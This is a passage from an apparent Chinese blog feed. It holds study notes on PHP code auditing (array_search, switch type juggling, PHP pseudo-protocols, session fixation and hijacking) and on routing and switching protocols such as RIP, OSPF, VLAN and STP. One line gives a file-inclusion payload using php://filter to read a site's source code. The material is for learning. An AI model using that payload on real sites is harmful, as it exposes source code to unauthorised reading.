函数在数组中搜索某个键值，并返回对应的键名。如果在数组中找到指定的键值，则返回对应的键名，否则返回 FALSE。如果在数组中找到键值超过一次，则返回第一次找到的键值所匹配的键名。</p><blockquote><p>array_search(<em>value</em>, <em>array</em>, <em>strict</em>) </p></blockquote><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/array_search.png" alt></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p>如果 switch 是数字类型的 case 判断时，switch 会将参数转换为 int 类型</p><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><ul><li>用于访问本地系统文件，不受 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong> 影响</li><li>常与文件包含结合在一起使用</li></ul><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><ul><li>读取源代码并以base-64编码形式输出，不受 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong> 影响</li><li>常与文件包含结合在一起使用</li><li>经典用法：?file=php://filter/read=convert.base64-encode/resource=./index.php</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/filter.png" alt></p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><ul><li>可以访问请求的原始数据的只读流，<strong>allow_url_include</strong> 为 on 时可以使用，不受 <strong>allow_url_fopen</strong> 影响</li></ul><h1 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h1><ul><li>Session 固定攻击</li><li>Session 劫持攻击</li><li>通常出现在 cookie 验证上，通常不使用 session 认证</li></ul><h2 id="Session-劫持攻击"><a href="#Session-劫持攻击" class="headerlink" title="Session 劫持攻击"></a>Session 劫持攻击</h2><ul><li>获取用户的 session id，然后修改数据</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/session_1.png" alt></p><h2 id="Session-固定攻击"><a href="#Session-固定攻击" class="headerlink" title="Session 固定攻击"></a>Session 固定攻击</h2><ul><li>用户使用了黑客发送的 session id，网站就不会给用户发送 session id</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/session_2.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;常见-PHP-框架&quot;&gt;&lt;a href=&quot;#常见-PHP-框架&quot; class=&quot;headerlink&quot; title=&quot;常见 PHP 框架&quot;&gt;&lt;/a&gt;常见 PHP 框架&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;ThinkPHP&lt;/li&gt;
&lt;li&gt;Yaf&lt;/li&gt;
&lt;li&gt;Larav
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络总结(三)</title>
    <link href="http://yoursite.com/2019/06/03/%E8%B7%AF%E7%94%B1%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2019/06/03/路由基础/</id>
    <published>2019-06-03T03:00:52.167Z</published>
    <updated>2019-06-12T15:19:52.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Static-Routing"><a href="#Static-Routing" class="headerlink" title="Static Routing"></a>Static Routing</h1><h2 id="Router-Operations"><a href="#Router-Operations" class="headerlink" title="Router Operations"></a>Router Operations</h2><ul><li>负责在不同网段之间进行数据转发</li><li>通过路由表进行三层数据转发</li><li>维护路由表信息</li><li>在冗余路径中进行最优路径判断</li><li>在三层转发时应用特定转发策略</li></ul><blockquote><p>路由器默认只知道直连的路由信息，路由器永远是隔离网段的</p></blockquote><h2 id="Static-Routes"><a href="#Static-Routes" class="headerlink" title="Static Routes"></a>Static Routes</h2><ul><li>用于小型网络</li><li>管理员手工配置路由器路由表实现数据转发</li></ul><p>优点</p><ul><li>占用路由器资源小</li><li>可以严格控制路由转发</li><li>支持广泛</li></ul><p>缺点</p><ul><li>网络拓扑变动时无法自动更新</li><li>网络很大时配置维护复杂</li></ul><h2 id="路由器路由条目匹配方式"><a href="#路由器路由条目匹配方式" class="headerlink" title="路由器路由条目匹配方式"></a>路由器路由条目匹配方式</h2><ol><li>对数据进行精确匹配</li><li>只匹配子网掩码规定的位</li><li>匹配最终必须找到一个出接口才能进行转发</li><li>如果没有匹配路由，则丢弃数据包，并向源返回一个 ICMP 错误信息</li><li>路由器递归查找路由表，直到找到一个出接口为止</li></ol><h2 id="Default-Routes"><a href="#Default-Routes" class="headerlink" title="Default Routes"></a>Default Routes</h2><ul><li>缺省路由</li><li>匹配不知道的路由条目</li><li>最不精确，永远是最后匹配</li></ul><h2 id="Load-Balancing"><a href="#Load-Balancing" class="headerlink" title="Load Balancing"></a>Load Balancing</h2><ul><li>负载均衡存在于很多地方，这里仅仅只讨论底层网络的负载均衡</li><li>基于数据包的负载均衡</li><li>基于数据流的负载均衡 (效率更高一些)</li></ul><p>基于数据包 : 以数据包为单位，将数据包分在每个路径上</p><p>基于数据流 : 不同主机到目标主机采用不同的路径</p><h1 id="Dynamic-Routing-Protocol"><a href="#Dynamic-Routing-Protocol" class="headerlink" title="Dynamic Routing Protocol"></a>Dynamic Routing Protocol</h1><h2 id="Routing-Protocol-amp-Routed-Protocol"><a href="#Routing-Protocol-amp-Routed-Protocol" class="headerlink" title="Routing Protocol &amp; Routed Protocol"></a>Routing Protocol &amp; Routed Protocol</h2><ul><li>路由协议用在不同路由器之间，用来判断到远程网络的路径并维护路由器的路由表</li><li>当路径决定之后，路由器会将被路由协议转发到目的网络</li><li>被路由协议一般指三层协议，指的是 IP 协议</li></ul><blockquote><p>被路由协议通过路由协议学习路由进行转发</p></blockquote><h2 id="Dynamic-Routing-Protocol-1"><a href="#Dynamic-Routing-Protocol-1" class="headerlink" title="Dynamic Routing Protocol"></a>Dynamic Routing Protocol</h2><ul><li>动态路由协议是运行在路由器上的一个程序，通过路由器的网络，交换数据包来交换路由信息</li><li>不同路由器之间通过运行的特定协议，相互交换路由信息</li></ul><h2 id="Classful-Routing-有类别路由协议"><a href="#Classful-Routing-有类别路由协议" class="headerlink" title="Classful Routing 有类别路由协议"></a>Classful Routing 有类别路由协议</h2><ul><li>更新中不使用子网掩码</li><li>在一个网络中，只是用相同的子网掩码</li><li>在主类网边界进行自动汇总</li><li>常见协议：RIPv1, IGRP</li></ul><h2 id="Classless-Routing-无类别路由协议"><a href="#Classless-Routing-无类别路由协议" class="headerlink" title="Classless Routing 无类别路由协议"></a>Classless Routing 无类别路由协议</h2><ul><li>更新中携带子网掩码</li><li>支持 VLSM，在同一网络中可以拥有不同子网掩码</li><li>支持手工汇总</li><li>常见协议：RIPv2, EIGRP, OSPF</li></ul><h2 id="最佳路由的判定"><a href="#最佳路由的判定" class="headerlink" title="最佳路由的判定"></a>最佳路由的判定</h2><ul><li>Metric(度量值)</li><li>RIP：Hop Count</li><li>OSPF：COST(带宽)</li><li>EIGRP：Bandwidth, Delay</li></ul><h1 id="RIP-Protocol"><a href="#RIP-Protocol" class="headerlink" title="RIP Protocol"></a>RIP Protocol</h1><h2 id="Distance-Vector-Routing-Protocol"><a href="#Distance-Vector-Routing-Protocol" class="headerlink" title="Distance Vector Routing Protocol"></a>Distance Vector Routing Protocol</h2><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>距离矢量型路由信息协议，最根本特点是直接发送路由信息</li><li>RIP 使用跳数( hop )作为度量值</li><li>距离：跳数(源到目标经过了多少三层设备，或者是具有路由功能的设备)</li><li>矢量：出接口</li><li>使用 UDP 协议，端口号 520</li><li>路由器周期性的发送自己的路由表信息，默认周期 30s</li><li>路由器经过多个周期来达到收敛完成(所有路由器路由表完整)</li></ul><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><ul><li>路由环路</li></ul><h2 id="Solution-to-Routing-Loops"><a href="#Solution-to-Routing-Loops" class="headerlink" title="Solution to Routing Loops"></a>Solution to Routing Loops</h2><p>路由环路：收敛速度过慢导致不一致的路由信息，从而导致路由环路，其特征为度量值不断上涨</p><h3 id="Maximum-Hop-Count"><a href="#Maximum-Hop-Count" class="headerlink" title="Maximum Hop Count"></a>Maximum Hop Count</h3><ul><li>定义最大跳数 16，为网络不可达</li></ul><h3 id="Split-Horizon"><a href="#Split-Horizon" class="headerlink" title="Split Horizon"></a>Split Horizon</h3><ul><li>永远不会将一个路由信息从接收这个信息的接口发送出去</li></ul><h3 id="Route-Poisoning-and-Poison-Reverse"><a href="#Route-Poisoning-and-Poison-Reverse" class="headerlink" title="Route Poisoning and Poison Reverse"></a>Route Poisoning and Poison Reverse</h3><ul><li>当网络不可达时将他的度量值置为无穷大，并向外发送出去</li></ul><h3 id="Hold-Down-Timers"><a href="#Hold-Down-Timers" class="headerlink" title="Hold-Down Timers"></a>Hold-Down Timers</h3><ul><li>当收到次优路由时，不立即相信，设置一个抑制计时器，默认 180s，当计时器减到 0 时，更新路由表</li></ul><blockquote><p>次优路由：度量值大，由可达变为不可达</p></blockquote><h3 id="Triggered-Updates"><a href="#Triggered-Updates" class="headerlink" title="Triggered Updates"></a>Triggered Updates</h3><ul><li>The router sends updates when a change in its routing table occurs</li></ul><h1 id="EIGRP-Protocol"><a href="#EIGRP-Protocol" class="headerlink" title="EIGRP Protocol"></a>EIGRP Protocol</h1><h2 id="EIGRP-Features"><a href="#EIGRP-Features" class="headerlink" title="EIGRP Features"></a>EIGRP Features</h2><ul><li>Cisco private protocol</li><li>Advanced distance vector</li><li>Fast convergence</li><li>Support for VLSM and discontiguous subnets</li><li>Partial updates</li><li>Support for multiple network-layer protocols</li><li>Flexible network design</li><li>100% loop-free classless routing</li><li>Multicast and unicast instead of broadcast address</li><li>Loading balancing across equal-cost and unequal-cost pathways</li></ul><blockquote><p>高级的企业级路由选择协议，地位和 OSPF 相当</p></blockquote><h2 id="EIGRP-Neighbor-Table"><a href="#EIGRP-Neighbor-Table" class="headerlink" title="EIGRP Neighbor Table"></a>EIGRP Neighbor Table</h2><ul><li>和所有直连路由器进行条件协商，就是进行条件检查，满足条件才会建立连接关系</li><li>所有邻居保存在 Neighbor Table 中，并通过 Neighbor Table 检查状态</li><li>邻居又叫下一跳</li></ul><h2 id="EIGRP-Topology-Table"><a href="#EIGRP-Topology-Table" class="headerlink" title="EIGRP Topology Table"></a>EIGRP Topology Table</h2><ul><li>所有从邻居学习来的路由全部保存在 Topology Table 中</li></ul><h2 id="EIGRP-Routing-Table"><a href="#EIGRP-Routing-Table" class="headerlink" title="EIGRP Routing Table"></a>EIGRP Routing Table</h2><ul><li>从 Topology Table 中选择最优的，无环的路径保存在 Routing Table 中</li></ul><h2 id="DUAL-Terminology"><a href="#DUAL-Terminology" class="headerlink" title="DUAL Terminology"></a>DUAL Terminology</h2><ul><li>扩散更新算法，EIGRP 底层所使用的算法</li><li>选择到达目标网络最优的，无环路径</li><li>AD = 下一跳路由到达目标网络的开销</li><li>FD = 本地路由器到达目标网络的开销 = AD + 本地路由到达通告给我 AD 的下一跳路由的开销</li><li>Lowest-cost = lowest FD</li><li>successor = 到达目标网络的最优的下一跳路由器</li><li>Feasible successor = 到达目标网络的次优的下一跳路由器</li><li>FC 可行条件 : AD &lt; FDmin，用于防环</li></ul><blockquote><p>当某个路由不可达或没有后继路由会执行一种扩散运算，向所有邻居发送数据，并且必须收到所有回复后才能变为不可达状态</p></blockquote><h2 id="EIGRP-Packets"><a href="#EIGRP-Packets" class="headerlink" title="EIGRP Packets"></a>EIGRP Packets</h2><ul><li>EIGRP数据包直接使用 IP 协议，协议号 88</li></ul><h2 id="EIGRP-Neighbor"><a href="#EIGRP-Neighbor" class="headerlink" title="EIGRP Neighbor"></a>EIGRP Neighbor</h2><p>EIGRP 建立邻接关系的条件：</p><ul><li>AS 号：进程域</li><li>K 值：使用相同的 Metric</li><li>认证</li></ul><h2 id="EIGRP-Metric"><a href="#EIGRP-Metric" class="headerlink" title="EIGRP Metric"></a>EIGRP Metric</h2><ul><li>缺省情况下使用 Bandwith 和 Delay</li><li>不建议使用 Reliability 和 Load，他们是变值</li></ul><h1 id="OSPF-Protocol"><a href="#OSPF-Protocol" class="headerlink" title="OSPF Protocol"></a>OSPF Protocol</h1><h2 id="Features-1"><a href="#Features-1" class="headerlink" title="Features"></a>Features</h2><ul><li>Open protocol</li><li>Link-State routing protocol</li><li>Identify a router uniquely with router-id </li></ul><blockquote><p>高级的企业级路由选择协议，地位和 EIGRP 相当</p><p>router-id : 一般使用 IP 地址</p></blockquote><h2 id="Link-State-Routing-Protocols"><a href="#Link-State-Routing-Protocols" class="headerlink" title="Link-State Routing Protocols"></a>Link-State Routing Protocols</h2><ul><li>每个路由选择由每个路由器独立决策</li><li>相邻路由器相互交换的是链路状态信息，即描述网络拓扑的信息，构成一个 Topological Database</li><li>最终每个路由器都会有一个全网的拓扑结构信息</li><li>每个路由只有在网络拓扑发生变化时才会发送更新</li><li>一般来讲，链路状态协议比距离矢量型协议判断决策更加准确</li></ul><h2 id="Link-State-Data-Structures"><a href="#Link-State-Data-Structures" class="headerlink" title="Link-State Data Structures"></a>Link-State Data Structures</h2><ul><li>邻居表 Neighbor table<ul><li>临接数据库</li><li>保存所有已知邻居</li></ul></li><li>拓扑表 Topology table<ul><li>又称为链路状态数据库( LSDB )</li><li>Contains all routes and their attached links in the area or network</li><li>Identical LSDB for all routers within an area</li></ul></li><li>路由表 Routing table<ul><li>又称为转发数据库( RIB )</li><li>保存到达目标网络的最优路径</li></ul></li></ul><blockquote><p>LSDB 由 LSA 这种数据结构构成，不同的 LSA 描述不同的网络结构信息</p></blockquote><h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><ul><li>每个路由器需要维护全网拓扑信息</li><li>占用大量内存</li><li>进行路由器计算时占用大量 CPU</li><li>每次路由计算时间较长</li><li>当细节网络出现变动时，全网路由器均需要重新收敛计算</li></ul><h2 id="分层的网络架构"><a href="#分层的网络架构" class="headerlink" title="分层的网络架构"></a>分层的网络架构</h2><ul><li>OSPF 强制使用分层架构</li><li>OSPF 定义了网络双层结构，定义了区域概念，通过区域划分，实现双层的网络架构<ul><li>传输区域 Transit area (骨干区域 backbone or area 0)</li><li>普通区域 Regular area (非骨干区域 nonbackbone areas)</li></ul></li></ul><blockquote><p>OSPF 规定，一个网络可以没有普通区域，但必须且只能有一个骨干区域，即区域 0 </p></blockquote><h2 id="OSPF-Areas"><a href="#OSPF-Areas" class="headerlink" title="OSPF Areas"></a>OSPF Areas</h2><ul><li>所有普通区域内的路由器只维护本区域的链路状态信息，骨干区域内的路由器维护全网的链路状态信息</li><li>不同区域的通信要经过骨干区域转发，即普通区域通过骨干区域互联</li><li>区域的定义是基于接口的，不能把某个路由器完整地放在区域里，只能把路由器的某个接口完整地放在区域里</li></ul><blockquote><p>OSPF 的所有的状态都是基于接口的</p></blockquote><h2 id="OSPF-Packet"><a href="#OSPF-Packet" class="headerlink" title="OSPF Packet"></a>OSPF Packet</h2><ul><li>直接使用 IP 协议，协议号 89</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/26.PNG" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Static-Routing&quot;&gt;&lt;a href=&quot;#Static-Routing&quot; class=&quot;headerlink&quot; title=&quot;Static Routing&quot;&gt;&lt;/a&gt;Static Routing&lt;/h1&gt;&lt;h2 id=&quot;Router-Operations
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络总结(二)</title>
    <link href="http://yoursite.com/2019/06/02/%E4%BA%A4%E6%8D%A2%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2019/06/02/交换基础/</id>
    <published>2019-06-02T02:51:27.389Z</published>
    <updated>2019-06-25T12:24:19.863Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Switch-and-LAN"><a href="#Switch-and-LAN" class="headerlink" title="Switch and LAN"></a>Switch and LAN</h1><h2 id="Hub"><a href="#Hub" class="headerlink" title="Hub"></a>Hub</h2><ul><li>属于同一个网段的计算机需要用二层设备连接起来，早期是使用 Hub 连接</li><li>Hub 实现的是一种共享型的连接，就是多个网络设备接在一根网线上，平分带宽</li><li>Hub 实现的共享型网络，很容易产生冲突，只用于小型网络</li><li>一台主机发出的信号其他主机都能收到</li></ul><h2 id="Bridges"><a href="#Bridges" class="headerlink" title="Bridges"></a>Bridges</h2><ul><li>Operate at Layer 2 of the OSI model</li><li>Forward, filter, or flood frames</li><li>Have few ports</li><li>Are slow</li></ul><blockquote><p>网桥具有二层的隔离性和过滤功能</p><p>网桥可以互联多个网段，并具有过滤二层流量的能力(根据 MAC 信息)</p></blockquote><h2 id="Switches"><a href="#Switches" class="headerlink" title="Switches"></a>Switches</h2><ul><li>Operate at Layer 2 of the OSI model</li><li>Forward, filter, or flood frames</li><li>Have many ports</li><li>Are fast</li></ul><blockquote><p>交换机是硬件处理，网桥是软件处理</p></blockquote><h2 id="Multiple-Collision-Domains"><a href="#Multiple-Collision-Domains" class="headerlink" title="Multiple Collision Domains"></a>Multiple Collision Domains</h2><ul><li>交换机处理冲突的方式：Microsegmentation</li><li>每个接口都是一个独立的冲突域，每个终端设备都是一个独立的冲突域</li><li>基本上不会有冲突发生，也就不需要 CSMA/CD 技术</li></ul><h2 id="Switching-Frames"><a href="#Switching-Frames" class="headerlink" title="Switching Frames"></a>Switching Frames</h2><ul><li>交换机一个主要的功能就是根据桥接表对数据帧进行智能转发</li><li>桥接表中的每个接口都会有一个 MAC 地址，开机时为空</li><li>源主机向交换机发送数据帧，交换机会查找帧中的源 MAC 地址，并记录在桥接表对应的接口</li><li>交换机查找桥接表中目的 MAC 地址，如果没有就会进行一次泛洪( flooding )操作</li><li>目标主机可能会有一个返回帧，交换机查找帧中的源 MAC 地址，并记录在桥接表对应的接口</li></ul><blockquote><p>这里指的是单播，对于广播和组播会进行泛洪操作</p><p>flooding : 交换机对除了源接口以外所有接口，进行转发</p></blockquote><h2 id="Transmitting-Frames"><a href="#Transmitting-Frames" class="headerlink" title="Transmitting Frames"></a>Transmitting Frames</h2><p><strong>Cut-Through</strong></p><p>Switch checks destination address and immediately begins forwarding frame</p><blockquote><p>速度快，但是不可靠</p></blockquote><p><strong>Store and Forward</strong></p><p>Complete frame is received and checked before forwarding</p><blockquote><p>速度慢，但是可靠</p></blockquote><p><strong>Feagment-Free</strong></p><p>Switch checks the first 64 bytes, then immediately begins fowarding frame</p><blockquote><p>中等速度，中等可靠</p></blockquote><h1 id="VLAN-and-Trunks"><a href="#VLAN-and-Trunks" class="headerlink" title="VLAN and Trunks"></a>VLAN and Trunks</h1><h2 id="现代企业网络架构"><a href="#现代企业网络架构" class="headerlink" title="现代企业网络架构"></a>现代企业网络架构</h2><ul><li>一层：Campus Backbone</li><li>二层：Building Distribution</li><li>三层：Building Access</li></ul><h2 id="VLAN-Overview"><a href="#VLAN-Overview" class="headerlink" title="VLAN Overview"></a>VLAN Overview</h2><ul><li>Segmentation</li><li>Flexibility</li><li>Security</li></ul><p>VLAN = Broadcast Domain = Logical Network( Subnet )</p><blockquote><p>交换机是不隔离广播的，路由器隔离广播域</p><p>不同的 VLAN 需要使用三层设备进行通信</p><p>VLAN的划分是基于接口的</p></blockquote><h2 id="VLAN-Trunking"><a href="#VLAN-Trunking" class="headerlink" title="VLAN Trunking"></a>VLAN Trunking</h2><ul><li>允许在一根线路上承载多个 VLAN 的流量</li><li>Trunk的协议：802.1Q 和 ISL，任选一种对不同 VLAN 的流量进行标记</li><li>通常交换机间的接口都是 Trunk 接口</li></ul><h2 id="Trunking-with-ISL"><a href="#Trunking-with-ISL" class="headerlink" title="Trunking with ISL"></a>Trunking with ISL</h2><ul><li>Cisco proprietary protocol</li><li>Uses an encapsulation process</li><li>Does not modify the original frame</li></ul><blockquote><p>在原始帧上增加 30 字节的 ISL 头部</p></blockquote><h2 id="Trunking-with-802-1Q"><a href="#Trunking-with-802-1Q" class="headerlink" title="Trunking with 802.1Q"></a>Trunking with 802.1Q</h2><ul><li>IEEE standard</li><li>Adds a 4-byte tag to the original frame</li><li>Modify the original frame</li></ul><blockquote><p>需要重新计算尾部的 CRC 校验</p></blockquote><h1 id="VTP"><a href="#VTP" class="headerlink" title="VTP"></a>VTP</h1><h2 id="VTP-Features"><a href="#VTP-Features" class="headerlink" title="VTP Features"></a>VTP Features</h2><ul><li>简化大型 VLAN 的配置，实现了 VLAN 的集中化，动态的配置</li><li>使用 C/S 架构，是一个二层协议，只在 Trunk接口发送信息</li><li>定义一台 VTP 服务器，其他的交换机就是客户机，当 VLAN 信息修改时，VTP 服务器会自动在 Trunk接口发送通告，VTP 客户机也会跟着修改</li><li>具有 VTP 域划分功能，每个域有一个域名标识，每个域信息可以不一样</li></ul><h2 id="VTP-Modes"><a href="#VTP-Modes" class="headerlink" title="VTP Modes"></a>VTP Modes</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/20.png" alt></p><blockquote><p>默认为 Server 模式，且域名为空</p></blockquote><h2 id="VTP-Operation"><a href="#VTP-Operation" class="headerlink" title="VTP Operation"></a>VTP Operation</h2><ul><li>VTP advertisements are sent as multicast frames</li><li>VTP servers and clients are synchronized to the latest revision number</li><li>VTP advertisements are sent every 5 minutes or when there is a change</li></ul><blockquote><p>每个通告都会有一个版本号标识，客户端的版本号和服务端相同，高版本信息会抵消掉低版本信息</p></blockquote><h1 id="STP"><a href="#STP" class="headerlink" title="STP"></a>STP</h1><h2 id="Redundant-Topology"><a href="#Redundant-Topology" class="headerlink" title="Redundant Topology"></a>Redundant Topology</h2><ul><li>对于企业网，通常通过冗余线路提高网络可用性，使用冗余拓扑防止单点故障</li><li>只要有冗余路径就会存在环路，从而带来不好的问题，比如广播风暴，多帧拷贝，MAC 表不稳定</li></ul><h2 id="Broadcast-Storms"><a href="#Broadcast-Storms" class="headerlink" title="Broadcast Storms"></a>Broadcast Storms</h2><ul><li>泛洪的三种数据帧：未知的单播帧，广播帧，组播帧</li><li>数据帧会一直在线路中打转，直到所有的带宽被占满</li><li>由于广播风暴的存在，广播越少越好</li></ul><h2 id="Multiple-Frame-Copies"><a href="#Multiple-Frame-Copies" class="headerlink" title="Multiple Frame Copies"></a>Multiple Frame Copies</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/21.png" alt></p><blockquote><p>交换机刚启动时，MAC 表为空</p></blockquote><h2 id="MAC-Database-Instability"><a href="#MAC-Database-Instability" class="headerlink" title="MAC Database Instability"></a>MAC Database Instability</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/22.png" alt></p><blockquote><p>需要卡在一个刚好的时间点</p></blockquote><h2 id="Loop-Resolution-with-STP"><a href="#Loop-Resolution-with-STP" class="headerlink" title="Loop Resolution with STP"></a>Loop Resolution with STP</h2><ul><li>IEEE 802.1D 标准协议</li><li>从软件层检测环路，并禁用一个接口，当线路故障时再启用接口</li></ul><h2 id="Spanning-Tree-Operation"><a href="#Spanning-Tree-Operation" class="headerlink" title="Spanning-Tree Operation"></a>Spanning-Tree Operation</h2><ul><li>One <strong>root bridge</strong> per broadcast domain</li><li>One <strong>root port</strong> per nonroot bridge</li><li>One <strong>designated port</strong> per segment</li><li><strong>Nondesignated ports</strong> are unused</li></ul><blockquote><p>root bridge：集中化转发数据，通常时核心交换机</p><p>root port：到达根网桥最近的接口，带宽最高</p><p>Nondesignated ports：最终阻断的是非指定接口</p><p>先比较交换机的桥 ID，桥 ID 最小的成为根网桥，根网桥上的接口都是指定接口。然后根据带宽 和 cost 选取根端口，不一定直连就是根接口。最后桥 ID 最小的是指定接口，其余的是非指定接口</p></blockquote><h2 id="STP-Root-Bridge-Selection"><a href="#STP-Root-Bridge-Selection" class="headerlink" title="STP Root Bridge Selection"></a>STP Root Bridge Selection</h2><ul><li>BPDU：桥接协议数据单元，描述生成树相关信息</li><li>Bridge ID：唯一标识交换机，64位(=16+48)</li><li>Bridge Priority：默认32768，最大65535</li><li>Root bridge = bridge with the lowest bridge ID</li><li>Bridge ID = Bridge Priority + MAC Address</li></ul><blockquote><p>先比较交换机的桥 ID，再比较接口优先级，最后比较接口 ID</p></blockquote><h2 id="Bridge-Protocol-Data-Unit"><a href="#Bridge-Protocol-Data-Unit" class="headerlink" title="Bridge Protocol Data Unit"></a>Bridge Protocol Data Unit</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/23.png" alt></p><ul><li>Root ID : 根网桥 ID</li><li>Cost of path : 路径开销，选举根接口</li><li>Bridge ID : 本网桥 ID</li><li>Port ID : 接口 ID</li><li>Max age : 2个 BPDU 之间的时间间隔</li></ul><h2 id="Spanning-Tree-Path-Cost"><a href="#Spanning-Tree-Path-Cost" class="headerlink" title="Spanning-Tree Path Cost"></a>Spanning-Tree Path Cost</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/24.png" alt></p><h2 id="Spanning-Tree-Path-States"><a href="#Spanning-Tree-Path-States" class="headerlink" title="Spanning-Tree Path States"></a>Spanning-Tree Path States</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/25.png" alt></p><blockquote><p>Listening：进行角色重选取，默认15s</p><p>Learning：只学习 MAC，不转发</p><p>Blocking,Forwarding是终态，Listening,Learning是过渡状态</p></blockquote><h1 id="RSTP"><a href="#RSTP" class="headerlink" title="RSTP"></a>RSTP</h1><h2 id="RSTP-Features"><a href="#RSTP-Features" class="headerlink" title="RSTP Features"></a>RSTP Features</h2><ul><li>降低网络故障时间</li><li>协议编号 IEEE 802.1W</li></ul><h2 id="RSTP-Port-States"><a href="#RSTP-Port-States" class="headerlink" title="RSTP Port States"></a>RSTP Port States</h2><ul><li>Discarding：不转发数据，不学习 MAC 地址</li><li>Learning：不转发数据，学习 MAC 地址</li><li>Forwarding：转发数据，学习 MAC 地址</li></ul><blockquote><p>STP 中这些时间固定，但是 RSTP 中时间不固定</p></blockquote><h2 id="RSTP-Port-Roles"><a href="#RSTP-Port-Roles" class="headerlink" title="RSTP Port Roles"></a>RSTP Port Roles</h2><ul><li>Root Ports</li><li>Designated Ports</li><li>Alternative Port：备份 Root Ports</li><li>Backup Port：备份 Designated Ports</li></ul><blockquote><p>如果指定接口发生故障，备份接口之间转为指定接口，减少重选举时间</p></blockquote><h2 id="Edge-Ports"><a href="#Edge-Ports" class="headerlink" title="Edge Ports"></a>Edge Ports</h2><ul><li>这个接口直接接终端设备</li><li>与 Access Port( port fast) 相同</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Switch-and-LAN&quot;&gt;&lt;a href=&quot;#Switch-and-LAN&quot; class=&quot;headerlink&quot; title=&quot;Switch and LAN&quot;&gt;&lt;/a&gt;Switch and LAN&lt;/h1&gt;&lt;h2 id=&quot;Hub&quot;&gt;&lt;a href=&quot;#Hu
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络总结(一)</title>
    <link href="http://yoursite.com/2019/06/02/OSI%20%E6%A8%A1%E5%9E%8B%E4%B8%8E%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E5%92%8C%E6%A6%82%E5%BF%B5/"/>
    <id>http://yoursite.com/2019/06/02/OSI 模型与常见网络模型和概念/</id>
    <published>2019-06-02T02:44:15.396Z</published>
    <updated>2019-06-12T16:30:10.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OSI模型"><a href="#OSI模型" class="headerlink" title="OSI模型"></a>OSI模型</h1><h2 id="A-Layered-Network-Model"><a href="#A-Layered-Network-Model" class="headerlink" title="A Layered Network Model"></a>A Layered Network Model</h2><ul><li>使用<strong>分层</strong>架构，每一个模块只负责自己特定的功能</li><li>不同模块之间定义标准化接口，实现每层的相互独立</li><li>TCP/IP协议就是基于OSI的一个实现</li></ul><h2 id="Physical"><a href="#Physical" class="headerlink" title="Physical"></a>Physical</h2><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p>Binary Transmission</p><ul><li>Defines the electrical, mechanical, procedural, and functional specifications for activating, maintaining, and deactivating the physical link</li></ul><blockquote><p>实现最基础的底层数据传输。定义底层传输的接口，传输的方式，传输的介质，传输的标准。数据怎么样通过介质传输，这些介质的定义，标准，全都由物理层决定。</p></blockquote><h3 id="Layer-1-Devices"><a href="#Layer-1-Devices" class="headerlink" title="Layer 1 Devices"></a>Layer 1 Devices</h3><ul><li>Layer 1 provides the physical media and its encoding</li><li>Examples<ul><li>Ethernet</li><li>Serial</li><li>Repeater</li><li>Physical interface of the NIC</li></ul></li></ul><h4 id="Network-Interface-Card"><a href="#Network-Interface-Card" class="headerlink" title="Network Interface Card"></a>Network Interface 